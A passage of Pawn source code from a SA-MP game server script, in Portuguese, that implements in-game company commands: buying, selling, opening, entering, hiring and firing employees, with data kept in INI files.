                   	SendClientMessage(playerid, AZUL_WE, " (D) para dono(a) ||| (F) para funcinonário(a) ||| (T) para todos os(as) jogadores(as).");
                    SendClientMessage(playerid, COR_BRANCO, " /Empresa Lucro - Comando para receber o lucro da empresa. (D)");
					SendClientMessage(playerid, COR_BRANCO, " /Empresa Trabalhar - Comando para iniciar um busca de mercadoria. (F)");
					SendClientMessage(playerid, COR_BRANCO, " /Empresa BaixaEntrega - Comando para dar baixa em uma mercadoria entregue. (F)");
                   	SendClientMessage(playerid, COR_BRANCO, " /Empresa Contratar - Comando para contratar um(a) funcinonário(a). (D)");
                   	SendClientMessage(playerid, COR_BRANCO, " /Empresa Info - Comando para ver as informações da empresa. (T)");
                   	SendClientMessage(playerid, COR_BRANCO, " /Empresa Mensagem - Comando para colocar uma mensagem na informação da empresa. (D)");
                   	SendClientMessage(playerid, COR_BRANCO, " /Empresa Demitir - Comando para demitir um(a) funcionário(a). (D)");
                    SendClientMessage(playerid, COR_BRANCO, " /Empresa Demissao - Comando para se demitir. (F)");
					SendClientMessage(playerid, COR_BRANCO, " /Empresa Info - Comando para ver as informações da empresa. (T)");
                   	return 1;
				}
			}
			return 1;
   		}
       	else if(!strcmp(tmp, "comprar", true))
        {
            for(new m = 0; m < MAX_EMPRESAS; m++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
			    {
			        //if(LiberadoEmpresa[playerid] == 1)
			        //{
					if(GetPlayerCash(playerid) < EmpresaInfo[m][Preco])
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não possui a quantia necessária!");
					    return 1;
					}
					if(!strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Essa empresa já é sua!");
						return 1;
					}
					if(strcmp(EmpresaInfo[m][Proprietario], "Ninguem", false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Essa empresa já tem dono(a)!");
						return 1;
					}
					new
					   	donoempresaID = WE_GetInt(gFile, "EmpresaID")
					;
					if(donoempresaID > 0)
					{
					    format(str, 128, "Você é dono(a) da empresa %s ID %d.", EmpresaInfo[donoempresaID][NomeEmp], donoempresaID);
						SendClientMessage(playerid, COR_ERRO, str);
						SendClientMessage(playerid, COR_ERRO, "Cada jogador(a) pode ter somente uma empresa, portando você não pode comprar esta empresa!");
						return 1;
					}
					new
					   	contraempresaID = WE_GetInt(gFile, "Contratado")
					;
					if(contraempresaID > 0)
					{
					    format(str, 128, "Você é funcinonário(a) da empresa %s ID %d.", EmpresaInfo[contraempresaID][NomeEmp], contraempresaID);
						SendClientMessage(playerid, COR_ERRO, str);
						SendClientMessage(playerid, COR_ERRO, "Para comprar uma empresa você não pode ser funcionário(a) de outra empresa!");
						return 1;
					}
	   				DestroyPickup(EmpresaPickup[m]);
					EmpresaPickup[m] = CreatePickup(1579, 23, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]);

				    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
					format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

					WE_SetInt(gFile, "EmpresaID", EmpresaInfo[m][Numero]);
					WE_SetInt(gStr, "Dono", 1);
					WE_SetString(gStr, "Proprietario", PlayerName(playerid));

					GivePlayerCash(playerid,-EmpresaInfo[m][Preco]);

					format(EmpresaInfo[m][Proprietario], 24, PlayerName(playerid));

					if(strcmp(EmpresaInfo[m][Funcionario1], "Ninguem", false))
					{
					    format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario1]);
						WE_SetInt(pFile, "Contratado", 0);
					}
					if(strcmp(EmpresaInfo[m][Funcionario2], "Ninguem", false))
					{
					    format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario2]);
						WE_SetInt(pFile, "Contratado", 0);
					}
					if(strcmp(EmpresaInfo[m][Funcionario3], "Ninguem", false))
					{
					    format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario3]);
						WE_SetInt(pFile, "Contratado", 0);
					}
					// F1
			   		format(EmpresaInfo[m][Funcionario1], 10, "Ninguem");
					WE_SetString(gStr, "Funcionario1", "Ninguem");
					WE_SetInt(gStr, "Producao1", 0);
					WE_SetInt(gStr, "P1Atual", 0);
                    WE_SetInt(gStr, "P1Time", 0);

					// F2
   					format(EmpresaInfo[m][Funcionario2], 10, "Ninguem");
					WE_SetString(gStr, "Funcionario2", "Ninguem");
					WE_SetInt(gStr, "Producao2", 0);
					WE_SetInt(gStr, "P2Atual", 0);
                    WE_SetInt(gStr, "P2Time", 0);

			   		// F3
			   		format(EmpresaInfo[m][Funcionario3], 10, "Ninguem");
					WE_SetString(gStr, "Funcionario3", "Ninguem");
					WE_SetInt(gStr, "Producao3", 0);
					WE_SetInt(gStr, "P3Atual", 0);
                    WE_SetInt(gStr, "P3Time", 0);

					// Infos Empresa
					format(EmpresaInfo[m][NomeEmpresa], 10, "Nenhum");
					format(EmpresaInfo[m][Horario], 10, "00:00:00");
					WE_SetString(gStr, "NomeEmpresa", "Nenhum");
					WE_SetString(gStr, "Login", WE_GetString(gFile, "ulData"));
					WE_SetString(gStr, "Horario", WE_GetString(gFile, "ulHorario"));
			        WE_SetInt(gStr, "Aberta", 1);
					EmpresaInfo[m][Aberta] = 1;
				    format(gstring, sizeof(gstring), "{FF1E1E}%s  ID %d\n{FFFFFF}Proprietário(a) {2E9CF7}%s\n{FFFFFF}/Empresa Info", EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero], EmpresaInfo[m][Proprietario]);
				    Update3DTextLabelText(EmpresaInfo[m][TxTt], -1, gstring);
		   			new
						zone[MAX_ZONE_NAME]
					;
					GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
					format(gstring, sizeof(gstring), "{00B503}Empresa {FFFFFF}%s {00B503}ID {FFFFFF}%d, {00B503}localizada em {FFFFFF}%s{00B503}, comprada por {FFFFFF}%s", EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero], zone, PlayerName(playerid));
					SendClientMessageToAll(0x00B503AA, gstring);
					/*}
			        else
			        {
			            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			        }*/
			        return 1;
				}
            }
            return 1;
        }
        else if(!strcmp(tmp, "abrir", true) && aInfo[playerid][Admin] == 1)
        {
            for(new m = 0; m < MAX_EMPRESAS; m++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
			    {
                    if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta empresa!");
						return 1;
					}
                    if(EmpresaInfo[m][Aberta] == 1)
					{
					    SendClientMessage(playerid, COR_ERRO, "A sua empresa já está aberta!");
						return 1;
					}
                    SendClientMessage(playerid, COR_AZULBEBE, "Sua empresa foi aberta.");
                    format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);
                    WE_SetInt(gStr, "Aberta", 1);
					EmpresaInfo[m][Aberta] = 1;
                }
            }
            return 1;
        }
        else if(!strcmp(tmp, "fechar", true) && aInfo[playerid][Admin] == 1)
        {
            for(new m = 0; m < MAX_EMPRESAS; m++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
			    {
                    if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta empresa!");
						return 1;
					}
                    if(EmpresaInfo[m][Aberta] == 0)
					{
					    SendClientMessage(playerid, COR_ERRO, "A sua empresa já está fechada!");
						return 1;
					}
                    SendClientMessage(playerid, COR_AZULBEBE, "Sua empresa foi fechada.");
                    format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);
                    WE_SetInt(gStr, "Aberta", 0);
					EmpresaInfo[m][Aberta] = 0;
                }
            }
            return 1;
        }
        else if(!strcmp(tmp, "entrar", true))
        {
            for(new m = 0; m < MAX_EMPRESAS; m++)
			{
		        if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
		        {
	        	    if(EntrouEmpresa[playerid] == 0)
	                {
	                    if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
						{
	                    	if(EmpresaInfo[m][Aberta] == 0)
							{
								SendClientMessage(playerid, COR_ERRO, "Esta empresa está fechada!");
								return 1;
							}
						}
	                    SetPlayerVirtualWorld(playerid, EmpresaInfo[m][VirtualWorld]);
	                    SetPlayerInterior(playerid, EmpresaInfo[m][InteriorID]);
	                	SetPlayerPos(playerid, EmpresaInfo[m][InteriorX], EmpresaInfo[m][InteriorY], EmpresaInfo[m][InteriorZ]);
						InCompanyPickup[playerid] = m;
	                	if(!strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
						{
	   	     				format(gstring, sizeof(gstring), "Você está na sua Empresa ID %d - %s, %s", EmpresaInfo[m][Numero], EmpresaInfo[m][EmpresaNome], PlayerName(playerid));
							SendClientMessage(playerid, 0x1E90FFAA, gstring);
	                	}
						else
						{
		   	     			format(gstring, sizeof(gstring), "Você está na Empresa ID %d - %s, que pertence a %s", EmpresaInfo[m][Numero], EmpresaInfo[m][EmpresaNome], EmpresaInfo[m][Proprietario]);
							SendClientMessage(playerid, 0x1E90FFAA, gstring);
						}
						EntrouEmpresa[playerid] = 1;
		              	return 1;
	                }
				}
			}
            return 1;
        }
        else if(!strcmp(tmp, "sair", true))
        {
            for(new m = 0; m < MAX_EMPRESAS; m++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
			    {
					if(EntrouEmpresa[playerid] == 1)
					{
			      		if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][InteriorX], EmpresaInfo[m][InteriorY], EmpresaInfo[m][InteriorZ]))
			        	{
			 				if(InCompanyPickup[playerid] == -1)
				 			{
				 			    SendClientMessage(playerid, COR_ERRO, "Você não está em uma empresa!");
							 	return 1;
							}
			   				SetPlayerVirtualWorld(playerid, 0);
			     			SetPlayerInterior(playerid, 0);
							SetPlayerPos(playerid, EmpresaInfo[InCompanyPickup[playerid]][PickupX], EmpresaInfo[InCompanyPickup[playerid]][PickupY], EmpresaInfo[InCompanyPickup[playerid]][PickupZ]);
							EntrouEmpresa[playerid] = 0;
		         			InCompanyPickup[playerid] = -1;
							return 1;
						}
					}
			 	}
            }
            return 1;
  		}
        else if(!strcmp(tmp, "info", true))
        {
            for(new m = 0; m < MAX_EMPRESAS; m++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
			    {
			        format(str, sizeof(str), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);
					new
				        stg[1500]
					;
					format(gstring, 256, "{FF1E1E}Empresa {FFFFFF}ID %d  {FFFF00}%s{FFFFFF}  Valor:{06EE45} R$%d", EmpresaInfo[m][Numero], EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Preco]);
					strcat(stg, gstring);
					format(gStr, 128, "\n{1E90FF} Proprietário(a) {FFFFFF}%s\n\n", EmpresaInfo[m][Proprietario]);
			        strcat(stg, gStr);
			        if(!strcmp(EmpresaInfo[m][Funcionario1], "Ninguem", true))
			        {
				        format(gStr, 128, "{FFFFFF}{FF1E1E}Funcionário(a) 1 {FFFFFF}Vaga livre.\n");
				        strcat(stg, gStr);
			        }
			        else
			        {
			        	format(gStr, 128, "{FFFFFF}{FF1E1E}Funcionário(a) 1 {FFFFFF}%s\n\t Produção Total %d\n\t Produção Atual %d\n", EmpresaInfo[m][Funcionario1], WE_GetInt(str, "Producao1"), WE_GetInt(str, "P1Atual"));
				        strcat(stg, gStr);
			        }
			        if(!strcmp(EmpresaInfo[m][Funcionario2], "Ninguem", true))
			        {
				        format(gStr, 128, "{FF1E1E}Funcionário(a) 2 {FFFFFF}Vaga livre.\n");
				        strcat(stg, gStr);
			        }
			        else
			        {
				        format(gStr, 128, "{FF1E1E}Funcionário(a) 2 {FFFFFF}%s\n\t Produção Total %d\n\t Produção Atual %d\n", EmpresaInfo[m][Funcionario2], WE_GetInt(str, "Producao2"), WE_GetInt(str, "P2Atual"));
				        strcat(stg, gStr);
			        }
			        if(!strcmp(EmpresaInfo[m][Funcionario3], "Ninguem", true))
			        {
				        format(gStr, 128, "{FF1E1E}Funcionário(a) 3 {FFFFFF}Vaga livre.\n");
				        strcat(stg, gStr);
			        }
			        else
		        	{
				        format(gStr, 128, "{FF1E1E}Funcionário(a) 3 {FFFFFF}%s\n\t Produção Total %d\n\t Produção Atual %d", EmpresaInfo[m][Funcionario3], WE_GetInt(str, "Producao3"), WE_GetInt(str, "P3Atual"));
				        strcat(stg, gStr);
			        }
			        if(!strcmp(EmpresaInfo[m][Proprietario], "Ninguem", false))
					{
			        	format(gStr, 128, "\n{FFFFFF}Último login do(a) proprietário(a): {00FF00}Empresa sem dono(a)");
					}
					else
					{
	        			format(pFile, 128, "Contas/%s.ini", EmpresaInfo[m][Proprietario]);
			        	format(gStr, 128, "\n{FFFFFF}Último login do(a) proprietário(a): %s", WE_GetString(pFile, "ulData"));
					}
					strcat(stg, gStr);
					ShowPlayerDialog(playerid, D_EMPRINFO, DIALOG_STYLE_MSGBOX, "{FFFFFF}Informações da empresa", stg, "OK", "");
        		}
			}
			return 1;
		}
		else if(!strcmp(tmp, "liberar", true))
		{
			for(new m = 0; m < MAX_EMPRESAS; m++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
				{
					if(aInfo[playerid][Admin] == 1)
					{
						format(gFile, sizeof(gFile), "Contas/%s.ini", EmpresaInfo[m][Proprietario]);
						format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

						DestroyPickup(EmpresaPickup[m]);
						EmpresaPickup[m] = CreatePickup(1577, 23, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]);

						WE_SetInt(gFile, "EmpresaID", 0);
						WE_SetInt(gFile, "Contratado", 0);
						WE_SetInt(gStr, "Dono", 0);

						format(EmpresaInfo[m][Proprietario], 24, "Ninguem");
						WE_SetString(gStr, "Proprietario", "Ninguem");

						if(strcmp(EmpresaInfo[m][Funcionario1], "Ninguem", false))
						{
							format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario1]);
							WE_SetInt(pFile, "Contratado", 0);
						}
						if(strcmp(EmpresaInfo[m][Funcionario2], "Ninguem", false))
						{
							format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario2]);
							WE_SetInt(pFile, "Contratado", 0);
						}
						if(strcmp(EmpresaInfo[m][Funcionario3], "Ninguem", false))
						{
							format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario3]);
							WE_SetInt(pFile, "Contratado", 0);
						}
						format(EmpresaInfo[m][Funcionario1], 12, "Ninguem");
						WE_SetString(gStr, "Funcionario1", "Ninguem");
						format(EmpresaInfo[m][Funcionario2], 12, "Ninguem");
						WE_SetString(gStr, "Funcionario2", "Ninguem");
						format(EmpresaInfo[m][Funcionario3], 12, "Ninguem");
						WE_SetString(gStr, "Funcionario3", "Ninguem");
						WE_SetString(gStr, "NomeEmpresa", "Nenhum");
						format(EmpresaInfo[m][NomeEmpresa], 64, "Nenhum");
						format(EmpresaInfo[m][NomeEmp], 12, "Nenhum");
						WE_SetString(gStr, "Login", "00/00/0000");
						WE_SetString(gStr, "Horario", "00:00:00");
						format(EmpresaInfo[m][Horario], 12, "00:00:00");
						WE_SetInt(gStr, "Producao1", 0);
						WE_SetInt(gStr, "Producao2", 0);
						WE_SetInt(gStr, "Producao3", 0);
						WE_SetInt(gStr, "Aberta", 1);
						EmpresaInfo[m][Aberta] = 1;
						format(gstring, sizeof(gstring), "{FF1E1E}%s  ID %d\n{FFFFFF}Proprietário(a) {2E9CF7}%s\n{FFFFFF}/Empresa Info", EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero], EmpresaInfo[m][Proprietario]);
						Update3DTextLabelText(EmpresaInfo[m][TxTt], -1, gstring);
						new
						zone[MAX_ZONE_NAME]
						;
						GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
						format(gstring, sizeof(gstring), "O(A) administrador(a) {FFFFFF}%s {FFFF00}liberou a Empresa ID {FFFFFF}%d, {FFFF00}localizada em: {FFFFFF}%s", PlayerName(playerid), EmpresaInfo[m][Numero], zone);
						SendClientMessageToAll(0xFFFF00FF, gstring);
						return 1;
					}
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "vender", true))
		{
			for(new m = 0; m < MAX_EMPRESAS; m++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
				{
					{
                    	if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
						{
					    	SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta empresa!");
							return 1;
						}
						format(gFile, sizeof(gFile), "Contas/%s.ini", EmpresaInfo[m][Proprietario]);
						format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

						DestroyPickup(EmpresaPickup[m]);
						EmpresaPickup[m] = CreatePickup(1577, 23, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]);

						WE_SetInt(gFile, "EmpresaID", 0);
						WE_SetInt(gFile, "Contratado", 0);
						WE_SetInt(gStr, "Dono", 0);

						format(EmpresaInfo[m][Proprietario], 24, "Ninguem");
						WE_SetString(gStr, "Proprietario", "Ninguem");

						if(strcmp(EmpresaInfo[m][Funcionario1], "Ninguem", false))
						{
							format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario1]);
							WE_SetInt(pFile, "Contratado", 0);
						}
						if(strcmp(EmpresaInfo[m][Funcionario2], "Ninguem", false))
						{
							format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario2]);
							WE_SetInt(pFile, "Contratado", 0);
						}
						if(strcmp(EmpresaInfo[m][Funcionario3], "Ninguem", false))
						{
							format(pFile, sizeof(pFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario3]);
							WE_SetInt(pFile, "Contratado", 0);
						}
						format(EmpresaInfo[m][Funcionario1], 12, "Ninguem");
						WE_SetString(gStr, "Funcionario1", "Ninguem");
						format(EmpresaInfo[m][Funcionario2], 12, "Ninguem");
						WE_SetString(gStr, "Funcionario2", "Ninguem");
						format(EmpresaInfo[m][Funcionario3], 12, "Ninguem");
						WE_SetString(gStr, "Funcionario3", "Ninguem");
						WE_SetString(gStr, "NomeEmpresa", "Nenhum");
						format(EmpresaInfo[m][NomeEmpresa], 64, "Nenhum");
						format(EmpresaInfo[m][NomeEmp], 12, "Nenhum");
						WE_SetString(gStr, "Login", "00/00/0000");
						WE_SetString(gStr, "Horario", "00:00:00");
						format(EmpresaInfo[m][Horario], 12, "00:00:00");
						WE_SetString(gStr, "Mensagem", "Nada");
						WE_SetInt(gStr, "Producao1", 0);
						WE_SetInt(gStr, "Producao2", 0);
						WE_SetInt(gStr, "Producao3", 0);
						WE_SetInt(gStr, "Aberta", 1);
						EmpresaInfo[m][Aberta] = 1;
						sGivePlayerCash(playerid, EmpresaInfo[m][Preco] * 90 / 100);
				        format(gstring, sizeof(gstring), "{FF1E1E}%s  ID %d\n{FFFFFF}Proprietário(a) {2E9CF7}%s\n{FFFFFF}/Empresa Info", EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero], EmpresaInfo[m][Proprietario]);
				    	Update3DTextLabelText(EmpresaInfo[m][TxTt], -1, gstring);
						new
						zone[MAX_ZONE_NAME]
						;
						GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
						format(gstring, sizeof(gstring), "Empresa ID {FFFFFF}%d{FFFF00}, localizada em {FFFFFF}%s{FFFF00}, vendida por {FFFFFF}%s", EmpresaInfo[m][Numero], zone, PlayerName(playerid));
						SendClientMessageToAll(0xFFFF00FF, gstring);
						return 1;
					}
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "contratar", true))
		{
			for(new m = 0; m < MAX_EMPRESAS; m++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
				{
					format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

					if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta empresa!");
						return 1;
					}
					if(strcmp(EmpresaInfo[m][Funcionario1], "Ninguem", false) && strcmp(EmpresaInfo[m][Funcionario2], "Ninguem", false) && strcmp(EmpresaInfo[m][Funcionario3], "Ninguem", false))
					{
						SendClientMessage(playerid, COR_ERRO, "Já excedeu o limite de funcionários em sua empresa!");
						return 1;
					}
					tmp = strtok(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COR_ERRO, "Uso válido: /Empresa Contratar [ID]");
						return 1;
					}
					new
					id = strval(tmp)
					;
					if(GetDistanceBetweenPlayers(playerid, id) > 5)
					{
						SendClientFormat(playerid, COR_ERRO, "%s está muito longe da empresa, peça para ele vim mais próximo!", PlayerName(id));
						return 1;
					}
					if(!IsPlayerConnected(id))
					{
						SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
						return 1;
					}
					if(playerid == id)
					{
						SendClientMessage(playerid, COR_ERRO, "Você não pode contratar você mesmo(a) para sua empresa!");
						return 1;
					}
					new
					donoempresaID = WE_GetInt(f(id), "EmpresaID")
					;
					if(donoempresaID > 0)
					{
						SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) é dono(a) de uma empresa!");
						return 1;
					}
					new
					contratadoID = WE_GetInt(f(id), "Contratado")
					;
					if(contratadoID > 0)
					{

						if(!strcmp(EmpresaInfo[contratadoID][Funcionario1], PlayerName(playerid), true) || !strcmp(EmpresaInfo[contratadoID][Funcionario2], PlayerName(playerid), true) || strcmp(EmpresaInfo[contratadoID][Funcionario3], PlayerName(playerid), true))
						{
							SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) já é funcionário(a) de uma empresa!");
						}
						return 1;
					}
					format(gstring, sizeof(gstring), "%s está lhe oferecendo um contrato para trabalhar na empresa dele.", PlayerName(playerid));
					SendClientMessage(id, AZUL_WE, gstring);
					format(gstring, sizeof(gstring), "Você está oferecendo para %s um contrato para ele(a) trabalhar na sua empresa.", PlayerName(id));
					SendClientMessage(playerid, AZUL_WE, gstring);
					DonoEmpresa[id] = playerid;
					AceitarContrato[id] = 1;
					ContratoMsg[id] = 5;
					T_Contratado[id] = SetTimerEx("MensagemContrato", 3000, false, "d", id);
					return 1;
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "demitir", true))
		{
        	for(new m = 0; m < MAX_EMPRESAS; m++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
			    {
	               	if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false) && WE_GetInt(f(playerid), "AdminL") == 0)
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta empresa!");
						return 1;
					}

					format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

					tmp = strtok(cmdtext, idx);

			   		if(!strlen(tmp))
			     	{
				    	SendClientMessage(playerid, COR_ERRO, "Uso válido: /empresa demitir [f1/f2/f3]");
				    	return 1;
			      	}
			       	else if(!strcmp(tmp, "f1", true))
			       	{
                  		if(!strcmp(EmpresaInfo[m][Funcionario1], "Ninguem", true))
						{
						    SendClientMessage(playerid, COR_ERRO, "Não à ninguém ocupando a vaga número 1!");
							return 1;
						}
						SendClientFormat(playerid, COR_AMARELO, "Você demitiu %s da sua empresa que ocupava a vaga número 1!", EmpresaInfo[m][Funcionario1]);
						format(gFile, sizeof(gFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario1]);
						foreach(Player, i)
						{
						  	if(!strcmp(PlayerName(i), EmpresaInfo[m][Funcionario1], false))
				    		{
						     	SendClientFormat(i, COR_AMARELO, "Você foi demitido da empresa de %s", PlayerName(playerid));
						    }
						}
						WE_SetInt(gFile, "Contratado", 0);
						format(EmpresaInfo[m][Funcionario1], 64, "Ninguem");
						WE_SetString(gStr, "Funcionario1", "Ninguem");
						WE_SetInt(gStr, "Producao1", 0);
						WE_SetInt(gStr, "P1Atual", 0);
			       	}
			      	else if(!strcmp(tmp, "f2", true))
			       	{
                  		if(!strcmp(EmpresaInfo[m][Funcionario2], "Ninguem", true))
						{
						    SendClientMessage(playerid, COR_ERRO, "Não à ninguém ocupando a vaga número 2!");
							return 1;
						}
						SendClientFormat(playerid, COR_AMARELO, "Você demitiu %s da sua empresa que ocupava a vaga número 3!", EmpresaInfo[m][Funcionario2]);
						format(gFile, sizeof(gFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario2]);
						foreach(Player, i)
						{
							if(!strcmp(PlayerName(i), EmpresaInfo[m][Funcionario2], false))
							{
						    	SendClientFormat(i, COR_AMARELO, "Você foi demitido da empresa de %s", PlayerName(playerid));
						    }
						}
						WE_SetInt(gFile, "Contratado", 0);
						format(EmpresaInfo[m][Funcionario2], 64, "Ninguem");
						WE_SetString(gStr, "Funcionario2", "Ninguem");
						WE_SetInt(gStr, "Producao2", 0);
						WE_SetInt(gStr, "P2Atual", 0);
			       	}
			       	else if(!strcmp(tmp, "f3", true))
			       	{
                  		if(!strcmp(EmpresaInfo[m][Funcionario3], "Ninguem", true))
						{
						    SendClientMessage(playerid, COR_ERRO, "Não à ninguém ocupando a vaga número 3!");
							return 1;
						}
						SendClientFormat(playerid, COR_AMARELO, "Você demitiu %s da sua empresa que ocupava a vaga número 3!", EmpresaInfo[m][Funcionario3]);
						format(gFile, sizeof(gFile), "Contas/%s.ini", EmpresaInfo[m][Funcionario3]);
						foreach(Player, i)
						{
							if(!strcmp(PlayerName(i), EmpresaInfo[m][Funcionario3], false))
						 	{
						    	SendClientFormat(i, COR_AMARELO, "Você foi demitido da empresa de %s", PlayerName(playerid));
						  	}
						}
						WE_SetInt(gFile, "Contratado", 0);
						format(EmpresaInfo[m][Funcionario3], 64, "Ninguem");
						WE_SetString(gStr, "Funcionario3", "Ninguem");
						WE_SetInt(gStr, "Producao3", 0);
						WE_SetInt(gStr, "P3Atual", 0);
			       	}
			       	return 1;
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "demissao", true))
		{
        	for(new m = 0; m < MAX_EMPRESAS; m++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
			    {
			    	if(!strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você é dono(a) desta empresa somente funcinários se demitem!");
						return 1;
					}
	               	if(strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não é funcionário(a) desta empresa!");
						return 1;
					}

					format(str, sizeof(str), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

			       	if(!strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), false))
			       	{
			       	    format(gStr, 128,"Você se demitiu da empresa %s ID %d que você trabalhava na produção 1.", EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero]);
						SendClientMessage(playerid, COR_AMARELO, gStr);
						WE_SetInt(f(playerid), "Contratado", 0);
						format(EmpresaInfo[m][Funcionario1], 24, "Ninguem");
						WE_SetString(str, "Funcionario1", "Ninguem");
						WE_SetInt(str, "Producao1", 0);
						WE_SetInt(str, "P1Atual", 0);
			       	}
			       	else if(!strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), false))
			       	{
			       	    format(gStr, 128,"Você se demitiu da empresa %s ID %d que você trabalhava na produção 2.", EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero]);
						SendClientMessage(playerid, COR_AMARELO, gStr);
						WE_SetInt(f(playerid), "Contratado", 0);
						format(EmpresaInfo[m][Funcionario2], 24, "Ninguem");
						WE_SetString(str, "Funcionario2", "Ninguem");
						WE_SetInt(str, "Producao2", 0);
						WE_SetInt(str, "P2Atual", 0);
			       	}
			       	else if(!strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), false))
			       	{
			       	    format(gStr, 128,"Você se demitiu da empresa %s ID %d que você trabalhava na produção 3.", EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero]);
						SendClientMessage(playerid, COR_AMARELO, gStr);
						WE_SetInt(f(playerid), "Contratado", 0);
